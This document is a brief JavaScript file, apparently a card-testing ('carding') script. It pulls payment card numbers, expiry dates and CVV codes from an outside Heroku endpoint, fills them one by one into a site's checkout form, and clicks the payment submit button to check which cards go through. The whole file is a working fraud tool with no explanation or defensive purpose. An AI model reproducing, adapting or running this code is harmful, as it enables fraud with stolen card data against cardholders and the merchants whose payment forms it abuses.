var postUrl = "https://altenen.herokuapp.com/post";
var iteration = null;
var options = {
     url:postUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
        var len = arr.length;

        var lastcc = JSON.parse( sessionStorage.card );

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    if( json.card == lastcc.card ) {
              $.ajax(options)
	      .success(cards);
            }
	    else {

	      $("#card-number").val(json.card);

              $("#card-type").val( json.card[0] == 4 ? "VI" : "MC" );

      	      $("#expiration-month").val(json.mon);
              $("#expiration-year").val(json.year);
	      $("#verification-code").val(json.cvv);
	      $("#payment-submit").click();
            }
	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
$.ajax(options)
.success(cards);